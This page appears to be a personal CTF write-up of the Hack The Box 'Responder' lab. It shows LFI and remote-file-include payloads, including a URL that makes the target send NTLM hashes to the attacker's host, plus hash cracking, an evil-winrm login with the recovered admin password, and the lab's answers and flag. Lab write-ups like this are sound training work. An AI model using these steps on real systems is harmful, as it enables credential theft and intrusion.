@@ -1,0 +1,707 @@
+<!DOCTYPE html>
+<html lang="en">
+   <head>
+      <meta charset="utf-8">
+      <meta content="width=device-width, initial-scale=1.0" name="viewport">
+      <title>Hack The Box Starting Point: Responder</title>
+      <meta content="" name="description">
+      <meta content="" name="keywords">
+      <!-- Favicons -->
+      <link href="../assets/img/favicon.png" rel="icon">
+      <link href="../assets/img/apple-touch-icon.png" rel="apple-touch-icon">
+      <!-- Google Fonts -->
+      <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Raleway:300,300i,400,400i,500,500i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i" rel="stylesheet">
+      <!-- Vendor CSS Files -->
+      <link href="../assets/vendor/aos/aos.css" rel="stylesheet">
+      <link href="../assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+      <link href="../assets/vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
+      <link href="../assets/vendor/boxicons/css/boxicons.min.css" rel="stylesheet">
+      <link href="../assets/vendor/glightbox/css/glightbox.min.css" rel="stylesheet">
+      <link href="../assets/vendor/swiper/swiper-bundle.min.css" rel="stylesheet">
+      <!-- Template Main CSS File -->
+      <link href="../assets/css/style.css" rel="stylesheet">
+      <!-- =======================================================
+         * Template Name: iPortfolio
+         * Updated: Mar 10 2023 with Bootstrap v5.2.3
+         * Template URL: https://bootstrapmade.com/iportfolio-bootstrap-portfolio-websites-template/
+         * Author: BootstrapMade.com
+         * License: https://bootstrapmade.com/license/
+         ======================================================== -->
+   </head>
+   <body>
+      <!-- ======= Mobile nav toggle button ======= -->
+      <i class="bi bi-list mobile-nav-toggle d-xl-none"></i>
+      <!-- ======= Header ======= -->
+      <header id="header">
+         <div class="d-flex flex-column">
+            <div class="profile">
+               <img src="../assets/img/profile-img.png" alt="" class="img-fluid rounded-circle">
+               <h1 class="text-light"><a href="../index.html">Ajith Chandarn</a></h1>
+               <div class="social-links mt-3 text-center">
+                  <a href="https://github.com/ajithchandranr" class="github"><i class="bx bxl-github"></i></a>
+                  <a href="https://www.linkedin.com/in/ajithchandranr/" class="linkedin"><i class="bx bxl-linkedin"></i></a>
+                  <a href="https://twitter.com/ajith_kmr" class="twitter"><i class="bx bxl-twitter"></i></a>
+               </div>
+            </div>
+         </div>
+         <div class="nav-menu-wrapper">
+            <nav id="navbar" class="nav-menu navbar">
+               <ul>
+                  <li><a href="../index.html#hero" class="nav-link scrollto"><i class="bx bx-home"></i> <span>Home</span></a></li>
+                  <li><a href="../index.html#about" class="nav-link scrollto"><i class="bx bx-user"></i> <span>About</span></a></li>
+                  <li><a href="../index.html#resume" class="nav-link scrollto"><i class="bx bx-file-blank"></i> <span>Resume</span></a></li>
+                  <li><a href="../index.html#portfolio" class="nav-link scrollto active"><i class="bx bxs-edit-alt"></i> <span>My Projects</span></a></li>
+                  <li><a href="../index.html#blog" class="nav-link scrollto"><i class="bx bxs-book-alt"></i> <span>Blog</span></a></li>
+                  <li><a href="../index.html#contact" class="nav-link scrollto"><i class="bx bx-envelope"></i> <span>Contact</span></a></li>
+               </ul>
+            </nav>
+            <!-- .nav-menu -->
+         </div>
+      </header>
+      <!-- End Header -->
+      <div class="social-links-container">
+         <div class="social-links-2">
+            <a href="../index.html" class="home"><i class="bx bx-home"></i></a>
+            <a href="https://github.com/ajithchandranr" class="github"><i class="bx bxl-github"></i></a>
+            <a href="https://www.linkedin.com/in/ajithchandranr/" class="linkedin"><i class="bx bxl-linkedin"></i></a>
+            <a href="https://twitter.com/ajith_kmr" class="twitter"><i class="bx bxl-twitter"></i></a>
+         </div>
+      </div>
+      <main id="main">
+         <!-- ======= Breadcrumbs ======= -->
+         <section id="breadcrumbs" class="breadcrumbs">
+            <div class="container">
+               <div class="d-flex justify-content-between align-items-center">
+                  <h2>Project Details</h2>
+                  <ol>
+                     <li><a href="../index.html">Home</a></li>
+                     <li><a href="../index.html#portfolio">My Projects</a></li>
+                  </ol>
+               </div>
+            </div>
+         </section>
+         <!-- End Breadcrumbs -->
+         <!-- ======= Portfolio Details Section ======= -->
+         <section id="portfolio-details" class="portfolio-details">
+            <div class="container">
+               <div class="portfolio-description">
+                  <figure>
+                  <h2>Hack The Box Starting Point: Responder</h2>
+               </div>
+               <div class="col-lg-8">
+                  <h6 style="font-size: 16px; margin-bottom: 25px;">Responder is a machine located in Hack The Box's Starting Point Tier 1. It provides a walkthrough on capturing NTLM hashes when the machine attempts to authenticate with a deceptive malicious SMB server that we will be setting up. This room offers valuable insights and learning opportunities on local file inclusion(LFI).</h6>
+               </div>
+               <div class="row gy-4">
+                  <div class="col-lg-8">
+                     <div class="portfolio-details-slider swiper">
+                        <div class="swiper-wrapper align-items-center">
+                           <div style="text-align: center;">
+                              <figure style="display: inline-block;">
+                                 <a href="javascript:;" class="zoom-icon" data-image="assets/hackthebox-responder/htb-r1.png">
+                                 <img src="assets/hackthebox-responder/htb-r1.png" alt="Image 1" class="img-fluid">
+                                 </a>
+                                 <figcaption style="display: block;">  </figcaption>
+                              </figure>
+                           </div>
+                        </div>
+                        <div class="swiper-pagination"></div>
+                     </div>
+                  </div>
+                  <div class="col-lg-4">
+                     <section class="portfolio-info">
+                        <h3>Project information</h3>
+                        <ul>
+                           <li><strong>Title</strong>: Responder</li>
+                           <li><strong>Organizer</strong>: Hack The Box</li>
+                           <li><strong>Project date</strong>: June, 2023</li>
+                           <li><strong>URL</strong>: <a href="https://www.hackthebox.com">www.hackthebox.com</a></li>
+                        </ul>
+                     </section>
+                     <article class="project-container">
+                        <div class="navigation">
+                           <div class="half-column">
+                              <div class="heading-button-container">
+                                 <h4 class="project-heading">Hack The Box Starting Point: Sequel</h4>
+                                 <a class="prev-button" href="hackthebox-sequel.html">Previous</a>
+                              </div>
+                           </div>
+                           <div class="half-column">
+                              <div class="heading-button-container">
+                                 <h4 class="project-heading">Active Directory in Home Lab : (Part 1) </h4>
+                                 <a class="next-button" href="home-lab-active-directory-part-1.html">Next</a>
+                              </div>
+                           </div>
+                        </div>
+                     </article>
+                  </div>
+                  <div class="col-lg-8">
+                     <div class="vpn-instructions">
+                        <h6>To obtain the VPN profile for connecting to Hack The Box, please follow these steps:</h6>
+                        <ol>
+                           <li>Click on the "HTB" button located in the top right corner.</li>
+                           <li>From the options, select "Starting Point".</li>
+                           <li>Choose "OpenVPN" and click on it.</li>
+                           <li>Finally, click on the "Download VPN" button to acquire the VPN profile.</li>
+                        </ol>
+                     </div>
+                  </div>
+                  <div class="col-lg-8">
+                     <h6 style="font-size: 16px; margin-bottom: 0px;">To connect to HTB, for <i class='bx bxl-windows' style='color:#149ddd; font-size: 20px;'></i> Windows users, download and install <a href="https://openvpn.net/client/client-connect-vpn-for-windows/">OpenVPN Connect</a> and load the VPN profile into the application. <i class='bx bxl-tux' style='color:#149ddd; font-size: 21px;'></i> Linux users can connect by opening a Terminal and entering the provided command below. Please allow a few minutes for the HTB website to acknowledge the connection.</h6>
+                  </div>
+                  <div class="col-lg-8">
+                     <h6 style="font-size: 16px; margin-bottom: 0px;">Begin by initiating a connection to the Starting Point VPN.</h6>
+                  </div>
+                  <div class="col-lg-8">
+                     <div class="pill-tab-code"> sudo openvpn [filename].ovpn </div>
+                  </div>
+               </div>
+               <div class="col-lg-8" style="margin-bottom: 30px;">
+                  <div class="portfolio-details-slider swiper">
+                     <div class="swiper-wrapper align-items-center">
+                        <div style="text-align: center;">
+                           <figure style="display: inline-block;">
+                              <a href="javascript:;" class="zoom-icon" data-image="assets/hackthebox-appointment/htb-a2.png">
+                              <img src="assets/hackthebox-appointment/htb-a2.png" alt="Image 1" class="img-fluid">
+                              </a>
+                              <figcaption style="display: block;">  </figcaption>
+                           </figure>
+                        </div>
+                     </div>
+                     <div class="swiper-pagination"></div>
+                  </div>
+               </div>
+               <div class="col-lg-8">
+                  <h6 style="font-size: 16px; margin-bottom: 25px;">Launch a new tab on your Kali Linux terminal while keeping the current tab connected to your lab session.</h6>
+               </div>
+               <div class="col-lg-8">
+                  <h6 style="font-size: 16px; margin-bottom: 15px;">Click the green "Spawn Machine" button to start the target machine's spawning process. Remember that the IP address for the target machine is 10.129.174.147. However, use the IP address you have received, as it may differ from the provided one.</h6>
+               </div>
+               <div class="col-lg-8" style="margin-bottom: 30px;">
+                  <div class="portfolio-details-slider swiper">
+                     <div class="swiper-wrapper align-items-center">
+                        <div style="text-align: center;">
+                           <figure style="display: inline-block;">
+                              <a href="javascript:;" class="zoom-icon" data-image="assets/hackthebox-responder/htb-r2.png">
+                              <img src="assets/hackthebox-responder/htb-r2.png" alt="Image 1" class="img-fluid">
+                              </a>
+                              <figcaption style="display: block;">  </figcaption>
+                           </figure>
+                        </div>
+                     </div>
+                     <div class="swiper-pagination"></div>
+                  </div>
+               </div>
+               <div class="col-lg-8">
+                  <h6 style="font-size: 16px; margin-bottom: 15px;"><b>Task 1</b> : When visiting the web service using the IP address, what is the domain that we are being redirected to?</h6>
+               </div>
+               <div class="col-lg-8" style="margin-bottom: 15px;">
+                  <div class="portfolio-details-slider swiper">
+                     <div class="swiper-wrapper align-items-center">
+                        <div style="text-align: center;">
+                           <figure style="display: inline-block;">
+                              <a href="javascript:;" class="zoom-icon" data-image="assets/hackthebox-responder/htb-r3.png">
+                              <img src="assets/hackthebox-responder/htb-r3.png" alt="Image 1" class="img-fluid">
+                              </a>
+                              <figcaption style="display: block;">  </figcaption>
+                           </figure>
+                        </div>
+                     </div>
+                     <div class="swiper-pagination"></div>
+                  </div>
+               </div>
+               <div class="col-lg-8">
+                  <h6 style="font-size: 16px; margin-bottom: 35px;"><b>Answer: unika.htb</b> </h6>
+               </div>
+               <div class="col-lg-8">
+                  <h6 style="font-size: 16px; margin-bottom: 25px;">At this time, we will proceed with conducting a standard <b>Nmap</b> scan.</h6>
+               </div>
+               <div class="col-lg-8">
+                  <code class="pill-tab-code">nmap -sS -p- -sV -sC 10.129.196.141</code>
+               </div>
+               <div class="col-lg-8" style="margin-bottom: 35px;">
+                  <div class="portfolio-details-slider swiper">
+                     <div class="swiper-wrapper align-items-center">
+                        <div style="text-align: center;">
+                           <figure style="display: inline-block;">
+                              <a href="javascript:;" class="zoom-icon" data-image="assets/hackthebox-responder/htb-r6.png">
+                              <img src="assets/hackthebox-responder/htb-r6.png" alt="Image 1" class="img-fluid">
+                              </a>
+                              <figcaption style="display: block;">  </figcaption>
+                           </figure>
+                        </div>
+                     </div>
+                     <div class="swiper-pagination"></div>
+                  </div>
+               </div>
+               <div class="col-lg-8">
+                  <h6 style="font-size: 16px; margin-bottom: 15px;">To address the issue of the website being inaccessible, we can modify the host file by executing the following command.</h6>
+               </div>
+               <div class="col-lg-8">
+                  <code class="pill-tab-code">echo "10.129.196.141  unika.htb" | sudo tee -a /etc/hosts
+                  </code>
+               </div>
+               <div class="col-lg-8">
+                  <h6 style="font-size: 16px; margin-bottom: 15px;">An alternative method to modify the hosts file is by manually visiting the location <b>/etc/hosts</b> and adding the entry directly.</h6>
+               </div>
+               <div class="col-lg-8" style="margin-bottom: 35px;">
+                  <div class="portfolio-details-slider swiper">
+                     <div class="swiper-wrapper align-items-center">
+                        <div style="text-align: center;">
+                           <figure style="display: inline-block;">
+                              <a href="javascript:;" class="zoom-icon" data-image="assets/hackthebox-responder/htb-r7.png">
+                              <img src="assets/hackthebox-responder/htb-r7.png" alt="Image 1" class="img-fluid">
+                              </a>
+                              <figcaption style="display: block;">  </figcaption>
+                           </figure>
+                        </div>
+                     </div>
+                     <div class="swiper-pagination"></div>
+                  </div>
+               </div>
+               <div class="col-lg-8">
+                  <h6 style="font-size: 16px; margin-bottom: 15px;">After including the entry in the hosts file, the website became accessible.</h6>
+               </div>
+               <div class="col-lg-8" style="margin-bottom: 35px;">
+                  <div class="portfolio-details-slider swiper">
+                     <div class="swiper-wrapper align-items-center">
+                        <div style="text-align: center;">
+                           <figure style="display: inline-block;">
+                              <a href="javascript:;" class="zoom-icon" data-image="assets/hackthebox-responder/htb-r8.png">
+                              <img src="assets/hackthebox-responder/htb-r8.png" alt="Image 1" class="img-fluid">
+                              </a>
+                              <figcaption style="display: block;">  </figcaption>
+                           </figure>
+                        </div>
+                     </div>
+                     <div class="swiper-pagination"></div>
+                  </div>
+               </div>
+               <div class="col-lg-8">
+                  <h6 style="font-size: 16px; margin-bottom: 15px;"><b>Task 2:</b> Which scripting language is being used on the server to generate webpages? </h6>
+               </div>
+               <div class="col-lg-8">
+                  <h6 style="font-size: 16px; margin-bottom: 15px;">You can identify the scripting language used on a server to generate webpages by using either the <b>Wappalyzer</b> browser extension or the <b>Nikto</b> command-line tool. Wappalyzer analyzes webpage elements, while Nikto focuses on web server scanning and vulnerability assessment.
+                  </h6>
+               </div>
+               <div class="col-lg-8" style="margin-bottom: 15px;">
+                  <div class="portfolio-details-slider swiper">
+                     <div class="swiper-wrapper align-items-center">
+                        <div style="text-align: center;">
+                           <figure style="display: inline-block;">
+                              <a href="javascript:;" class="zoom-icon" data-image="assets/hackthebox-responder/htb-r4.png">
+                              <img src="assets/hackthebox-responder/htb-r4.png" alt="Image 1" class="img-fluid">
+                              </a>
+                              <figcaption style="display: block;">  </figcaption>
+                           </figure>
+                        </div>
+                     </div>
+                     <div class="swiper-pagination"></div>
+                  </div>
+               </div>
+               <div class="col-lg-8" style="margin-bottom: 15px;">
+                  <div class="portfolio-details-slider swiper">
+                     <div class="swiper-wrapper align-items-center">
+                        <div style="text-align: center;">
+                           <figure style="display: inline-block;">
+                              <a href="javascript:;" class="zoom-icon" data-image="assets/hackthebox-responder/htb-r5.png">
+                              <img src="assets/hackthebox-responder/htb-r5.png" alt="Image 1" class="img-fluid">
+                              </a>
+                              <figcaption style="display: block;">  </figcaption>
+                           </figure>
+                        </div>
+                     </div>
+                     <div class="swiper-pagination"></div>
+                  </div>
+               </div>
+               <div class="col-lg-8">
+                  <h6 style="font-size: 16px; margin-bottom: 35px;"><b>Answer: php</b> </h6>
+               </div>
+               <div class="col-lg-8">
+                  <h6 style="font-size: 16px; margin-bottom: 25px;"> <b>TASK 3:</b> What is the name of the URL parameter which is used to load different language versions of the webpage?</h6>
+               </div>
+               <div class="col-lg-8" style="margin-bottom: 15px;">
+                  <div class="portfolio-details-slider swiper">
+                     <div class="swiper-wrapper align-items-center">
+                        <div style="text-align: center;">
+                           <figure style="display: inline-block;">
+                              <a href="javascript:;" class="zoom-icon" data-image="assets/hackthebox-responder/htb-r9.png">
+                              <img src="assets/hackthebox-responder/htb-r9.png" alt="Image 1" class="img-fluid">
+                              </a>
+                              <figcaption style="display: block;">  </figcaption>
+                           </figure>
+                        </div>
+                     </div>
+                     <div class="swiper-pagination"></div>
+                  </div>
+               </div>
+               <div class="col-lg-8">
+                  <h6 style="font-size: 16px; margin-bottom: 15px;"> When we change the language to German, we can observe that the parameter used is 'page'. <b>Page</b> serves as the query parameter, and we can provide the language as its value. </p>
+                  </h6>
+               </div>
+               <div class="col-lg-8">
+                  <h6 style="font-size: 16px; margin-bottom: 35px;"><b>Answer: page</b> </h6>
+               </div>
+               <div class="col-lg-8">
+                  <h6 style="font-size: 16px; margin-bottom: 25px;"> <b>TASK 4:</b> Which of the following values for the `page` parameter would be an example of exploiting a Local File Include (LFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"</h6>
+               </div>
+               <div class="col-lg-8">
+                  <h6 style="font-size: 16px; margin-bottom: 25px;"> The scenario presents different examples as questions, but it is evident from the answer field that the correct response is Local File Inclusion. This vulnerability involves including a local file on the system that should not be accessible. </h6>
+               </div>
+               <div class="col-lg-8">
+                  <h6 style="font-size: 16px; margin-bottom: 35px;"><b>Answer: ../../../../../../../../windows/system32/drivers/etc/hosts</b> </h6>
+               </div>
+               <div class="col-lg-8">
+                  <h6 style="font-size: 16px; margin-bottom: 25px;"> To delve deeper into the topic, let's conduct a Google search to gather additional information.</h6>
+               </div>
+               <div class="col-lg-8" style="margin-bottom: 15px;">
+                  <div class="portfolio-details-slider swiper">
+                     <div class="swiper-wrapper align-items-center">
+                        <div style="text-align: center;">
+                           <figure style="display: inline-block;">
+                              <a href="javascript:;" class="zoom-icon" data-image="assets/hackthebox-responder/htb-r10.png">
+                              <img src="assets/hackthebox-responder/htb-r10.png" alt="Image 1" class="img-fluid">
+                              </a>
+                              <figcaption style="display: block;">  </figcaption>
+                           </figure>
+                        </div>
+                     </div>
+                     <div class="swiper-pagination"></div>
+                  </div>
+               </div>
+               <div class="col-lg-8">
+                  <h6 style="font-size: 16px; margin-bottom: 45px;"> Based on the information obtained from Wappalyzer, we can identify that the server is running Apache. While exploring, I came across an intriguing <a href="https://github.com/drtychai/wordlists/blob/master/intruder/lfi.txt">website</a>. However, I have decided to utilize the solution provided for Task 4, as it involves finding a file that should exist on the system.</h6>
+               </div>
+               <div class="col-lg-8" style="margin-bottom: 0px;">
+                  <div class="portfolio-details-slider swiper">
+                     <div class="swiper-wrapper align-items-center">
+                        <div style="text-align: center;">
+                           <figure style="display: inline-block;">
+                              <a href="javascript:;" class="zoom-icon" data-image="assets/hackthebox-responder/htb-r11.png">
+                              <img src="assets/hackthebox-responder/htb-r11.png" alt="Image 1" class="img-fluid">
+                              </a>
+                              <figcaption style="display: block;">  </figcaption>
+                           </figure>
+                        </div>
+                     </div>
+                     <div class="swiper-pagination"></div>
+                  </div>
+               </div>
+               <div class="col-lg-8">
+                  <h6 style="font-size: 16px; margin-bottom: 35px;">Since it works, we could attempt to perform directory traversal by removing this part of the URL and exploring further. </h6>
+               </div>
+               <div class="col-lg-8" style="margin-bottom: 0px;">
+                  <div class="portfolio-details-slider swiper">
+                     <div class="swiper-wrapper align-items-center">
+                        <div style="text-align: center;">
+                           <figure style="display: inline-block;">
+                              <a href="javascript:;" class="zoom-icon" data-image="assets/hackthebox-responder/htb-r12.png">
+                              <img src="assets/hackthebox-responder/htb-r12.png" alt="Image 1" class="img-fluid">
+                              </a>
+                              <figcaption style="display: block;">  </figcaption>
+                           </figure>
+                        </div>
+                     </div>
+                     <div class="swiper-pagination"></div>
+                  </div>
+               </div>
+               <div class="col-lg-8">
+                  <h6 style="font-size: 16px; margin-bottom: 25px;"> After a successful previous attempt, an opportunity arises to employ this technique for reading PHP files that are typically restricted to server-side access. To further explore this, experimenting with implementing a filter can be fruitful. In my research, I discovered a valuable <a href="https://book.hacktricks.xyz/pentesting-web/file-inclusion">website</a>, which suggests using the filter value <br><b>convert.base64-encode/resource=index.php</b>. By applying this filter to the web address, the base64-encoded code was obtained.</h6>
+               </div>
+               <div class="col-lg-8" style="margin-bottom: 0px;">
+                  <div class="portfolio-details-slider swiper">
+                     <div class="swiper-wrapper align-items-center">
+                        <div style="text-align: center;">
+                           <figure style="display: inline-block;">
+                              <a href="javascript:;" class="zoom-icon" data-image="assets/hackthebox-responder/htb-r13.png">
+                              <img src="assets/hackthebox-responder/htb-r13.png" alt="Image 1" class="img-fluid">
+                              </a>
+                              <figcaption style="display: block;">  </figcaption>
+                           </figure>
+                        </div>
+                     </div>
+                     <div class="swiper-pagination"></div>
+                  </div>
+               </div>
+               <div class="col-lg-8">
+                  <h6 style="font-size: 16px; margin-bottom: 35px;">To reveal the original PHP code, one can utilize the command <br><b><code>echo &lt;base64 code&gt; | base64 -d</code></b>. This command decodes the base64-encoded content, enabling the viewer to observe the PHP code in its original form.</h6>
+               </div>
+               <div class="col-lg-8" style="margin-bottom: 35px;">
+                  <div class="portfolio-details-slider swiper">
+                     <div class="swiper-wrapper align-items-center">
+                        <div style="text-align: center;">
+                           <figure style="display: inline-block;">
+                              <a href="javascript:;" class="zoom-icon" data-image="assets/hackthebox-responder/htb-r14.png">
+                              <img src="assets/hackthebox-responder/htb-r14.png" alt="Image 1" class="img-fluid">
+                              </a>
+                              <figcaption style="display: block;">  </figcaption>
+                           </figure>
+                        </div>
+                     </div>
+                     <div class="swiper-pagination"></div>
+                  </div>
+               </div>
+               <div class="col-lg-8">
+                  <h6 style="font-size: 16px; margin-bottom: 25px;"><b>Task 5:</b> Which of the following values for the `page` parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"</h6>
+               </div>
+               <div class="col-lg-8">
+                  <h6 style="font-size: 16px; margin-bottom: 35px;"> <b>Answer: //10.10.14.6/somefile</b></h6>
+               </div>
+               <div class="col-lg-8">
+                  <h6 style="font-size: 16px; margin-bottom: 25px;"> <b>Task 6:</b> What does NTLM stand for?</h6>
+               </div>
+               <div class="col-lg-8">
+                  <h6 style="font-size: 16px; margin-bottom: 35px;">  <b>Answer: New Technology Lan Manager</b></h6>
+               </div>
+               <div class="col-lg-8">
+                  <h6 style="font-size: 16px; margin-bottom: 35px;">We are now approaching the objective of the box, which is to utilize the  <b>Responder </b>utility. Further details on Responder available <a href="https://www.sikich.com/insight/using-multirelay-with-responder-for-penetration-testing/">here<i class='bx bx-link-external' style='color:#149ddd; font-size: 20px;'></i></a>.</h6>
+               </div>
+               <div class="col-lg-8">
+                  <h6 style="font-size: 16px; margin-bottom: 25px;"> <b>Task 7:</b> Which flag do we use in the Responder utility to specify the network interface?</h6>
+               </div>
+               <div class="col-lg-8" style="margin-bottom: 25px;">
+                  <div class="portfolio-details-slider swiper">
+                     <div class="swiper-wrapper align-items-center">
+                        <div style="text-align: center;">
+                           <figure style="display: inline-block;">
+                              <a href="javascript:;" class="zoom-icon" data-image="assets/hackthebox-responder/htb-r15.png">
+                              <img src="assets/hackthebox-responder/htb-r15.png" alt="Image 1" class="img-fluid">
+                              </a>
+                              <figcaption style="display: block;">  </figcaption>
+                           </figure>
+                        </div>
+                     </div>
+                     <div class="swiper-pagination"></div>
+                  </div>
+               </div>
+               <div class="col-lg-8">
+                  <h6 style="font-size: 16px; margin-bottom: 35px;"> <b>Answer: -I</b></h6>
+               </div>
+               <div class="col-lg-8">
+                  <h6 style="font-size: 16px; margin-bottom: 25px;"> <b>Task 8:</b> There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as `john`, but the full name is what?</h6>
+               </div>
+               <div class="col-lg-8">
+                  <h6 style="font-size: 16px; margin-bottom: 35px;"> <b>Answer: John The Ripper </b>
+                  </h6>
+               </div>
+               <div class="col-lg-8">
+                  <h6 style="font-size: 16px; margin-bottom: 25px;"> <b>Task 9:</b> What is the password for the administrator user?</h6>
+               </div>
+               <div class="col-lg-8">
+                  <h6 style="font-size: 16px; margin-bottom: 25px;">To find the answer, we can initiate the Responder utility by executing the following command:</h6>
+               </div>
+               <div class="col-lg-8">
+                  <code class="pill-tab-code">responder -I tun0</code>
+               </div>
+               <div class="col-lg-8" style="margin-bottom: 25px;">
+                  <div class="portfolio-details-slider swiper">
+                     <div class="swiper-wrapper align-items-center">
+                        <div style="text-align: center;">
+                           <figure style="display: inline-block;">
+                              <a href="javascript:;" class="zoom-icon" data-image="assets/hackthebox-responder/htb-r16.png">
+                              <img src="assets/hackthebox-responder/htb-r16.png" alt="Image 1" class="img-fluid">
+                              </a>
+                              <figcaption style="display: block;">  </figcaption>
+                           </figure>
+                        </div>
+                     </div>
+                     <div class="swiper-pagination"></div>
+                  </div>
+               </div>
+               <div class="col-lg-8">
+                  <h6 style="font-size: 16px; margin-bottom: 25px;">Executing this command will configure multiple servers, attempting connections to a range of targets. However, it's important to note that not all servers may be accessible due to permissions and other factors on the victim's system.
+                  </h6>
+               </div>
+               <div class="col-lg-8">
+                  <h6 style="font-size: 16px; margin-bottom: 25px;"> Next, we will proceed to run the following URL in the browser : <br>"<b>unika.htb/index.php?page=//&lt;Responder_IP&gt;/somefile</b>", replacing &lt;<b>Responder_IP</b>&gt; with your Responder machine's IP address.
+                  </h6>
+               </div>
+               <div class="col-lg-8" style="margin-bottom: 25px;">
+                  <div class="portfolio-details-slider swiper">
+                     <div class="swiper-wrapper align-items-center">
+                        <div style="text-align: center;">
+                           <figure style="display: inline-block;">
+                              <a href="javascript:;" class="zoom-icon" data-image="assets/hackthebox-responder/htb-r17.png">
+                              <img src="assets/hackthebox-responder/htb-r17.png" alt="Image 1" class="img-fluid">
+                              </a>
+                              <figcaption style="display: block;">  </figcaption>
+                           </figure>
+                        </div>
+                     </div>
+                     <div class="swiper-pagination"></div>
+                  </div>
+               </div>
+               <div class="col-lg-8">
+                  <h6 style="font-size: 16px; margin-bottom: 25px;">Subsequently, the Responder utility will display the hash output
+                  </h6>
+               </div>
+               <div class="col-lg-8" style="margin-bottom: 35px;">
+                  <div class="portfolio-details-slider swiper">
+                     <div class="swiper-wrapper align-items-center">
+                        <div style="text-align: center;">
+                           <figure style="display: inline-block;">
+                              <a href="javascript:;" class="zoom-icon" data-image="assets/hackthebox-responder/htb-r18.png">
+                              <img src="assets/hackthebox-responder/htb-r18.png" alt="Image 1" class="img-fluid">
+                              </a>
+                              <figcaption style="display: block;">  </figcaption>
+                           </figure>
+                        </div>
+                     </div>
+                     <div class="swiper-pagination"></div>
+                  </div>
+               </div>
+               <div class="col-lg-8">
+                  <h6 style="font-size: 16px; margin-bottom: 25px;">After making a copy of the obtained hash and creating a new file, we can employ <b>John the Ripper</b> to crack the password by providing it with a wordlist.
+                  </h6>
+               </div>
+               <div class="col-lg-8" style="margin-bottom: 15px;">
+                  <div class="portfolio-details-slider swiper">
+                     <div class="swiper-wrapper align-items-center">
+                        <div style="text-align: center;">
+                           <figure style="display: inline-block;">
+                              <a href="javascript:;" class="zoom-icon" data-image="assets/hackthebox-responder/htb-r19.png">
+                              <img src="assets/hackthebox-responder/htb-r19.png" alt="Image 1" class="img-fluid">
+                              </a>
+                              <figcaption style="display: block;">  </figcaption>
+                           </figure>
+                        </div>
+                     </div>
+                     <div class="swiper-pagination"></div>
+                  </div>
+               </div>
+               <div class="col-lg-8">
+                  <h6 style="font-size: 16px; margin-bottom: 35px;"> <b>Answer: badminton </b>
+                  </h6>
+               </div>
+               <div class="col-lg-8">
+                  <h6 style="font-size: 16px; margin-bottom: 25px;"> <b>Task 10:</b> We'll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?</h6>
+               </div>
+               <div class="col-lg-8">
+                  <h6 style="font-size: 16px; margin-bottom: 35px;"> <b>Answer: 5985 </b>
+                  </h6>
+               </div>
+               <div class="col-lg-8">
+                  <h6 style="font-size: 16px; margin-bottom: 25px;"> <b>Submit root flag</b> </h6>
+               </div>
+               <div class="col-lg-8">
+                  <h6 style="font-size: 16px; margin-bottom: 25px;"> To retrieve the root flag, we can utilize the following command: </h6>
+               </div>
+               <div class="col-lg-8">
+                  <code class="pill-tab-code">evil-winrm -i 10.129.196.141 -u Administrator -p badminton</code>
+               </div>
+               <div class="col-lg-8" style="margin-bottom: 15px;">
+                  <div class="portfolio-details-slider swiper">
+                     <div class="swiper-wrapper align-items-center">
+                        <div style="text-align: center;">
+                           <figure style="display: inline-block;">
+                              <a href="javascript:;" class="zoom-icon" data-image="assets/hackthebox-responder/htb-r20.png">
+                              <img src="assets/hackthebox-responder/htb-r20.png" alt="Image 1" class="img-fluid">
+                              </a>
+                              <figcaption style="display: block;">  </figcaption>
+                           </figure>
+                        </div>
+                     </div>
+                     <div class="swiper-pagination"></div>
+                  </div>
+               </div>
+               <div class="col-lg-8">
+                  <h6 style="font-size: 16px; margin-bottom: 25px;">As we are currently connected to a PowerShell session, we can utilize commands like `cd..` to navigate through the directory structure and search for the root flag.
+                  </h6>
+               </div>
+               <div class="col-lg-8" style="margin-bottom: 15px;">
+                  <div class="portfolio-details-slider swiper">
+                     <div class="swiper-wrapper align-items-center">
+                        <div style="text-align: center;">
+                           <figure style="display: inline-block;">
+                              <a href="javascript:;" class="zoom-icon" data-image="assets/hackthebox-responder/htb-r21.png">
+                              <img src="assets/hackthebox-responder/htb-r21.png" alt="Image 1" class="img-fluid">
+                              </a>
+                              <figcaption style="display: block;">  </figcaption>
+                           </figure>
+                        </div>
+                     </div>
+                     <div class="swiper-pagination"></div>
+                  </div>
+               </div>
+               <div class="col-lg-8">
+                  <h6 style="font-size: 16px; margin-bottom: 25px;"> Ultimately, I managed to find and access the root flag, effectively compromising the <b>Responder box</b>.</h6>
+               </div>
+               <div class="col-lg-8">
+                  <h6 style="font-size: 16px; margin-bottom: 25px; text-align: center;"> <b>Flag : ea81b7afddd03efaa0945333ed147fac</b></h6>
+               </div>
+               <div class="col-lg-8" style="margin-bottom: 35px;">
+                  <div class="portfolio-details-slider swiper">
+                     <div class="swiper-wrapper align-items-center">
+                        <div style="text-align: center;">
+                           <figure style="display: inline-block;">
+                              <a href="javascript:;" class="zoom-icon" data-image="assets/hackthebox-responder/htb-r22.png">
+                              <img src="assets/hackthebox-responder/htb-r22.png" alt="Image 1" class="img-fluid">
+                              </a>
+                              <figcaption style="display: block;">  </figcaption>
+                           </figure>
+                        </div>
+                     </div>
+                     <div class="swiper-pagination"></div>
+                  </div>
+               </div>
+               <div class="col-lg-8">
+                  <h6 style="font-size: 16px; margin-bottom: 35px; text-align: center;"> Achievement <a href="https://www.hackthebox.com/achievement/machine/1521990/461"><i class='bx bx-link-external' style='color:#149ddd; font-size: 20px;'></i></a>
+                  </h6>
+               </div>
+               <div class="col-lg-8">
+                  <article class="custom-project-container" style="margin-bottom: 20px;">
+                     <div class="custom-navigation">
+                        <div class="custom-half-column">
+                           <a href="hackthebox-sequel.html" class="custom-project-heading">
+                           HackTheBox Starting Point Tier 1 machine: Sequel
+                           </a>
+                           <a class="custom-prev-button" href="hackthebox-sequel.html">Previous</a>
+                        </div>
+                        <div class="custom-half-column">
+                           <a href="home-lab-active-directory-part-1.html" class="custom-project-heading">
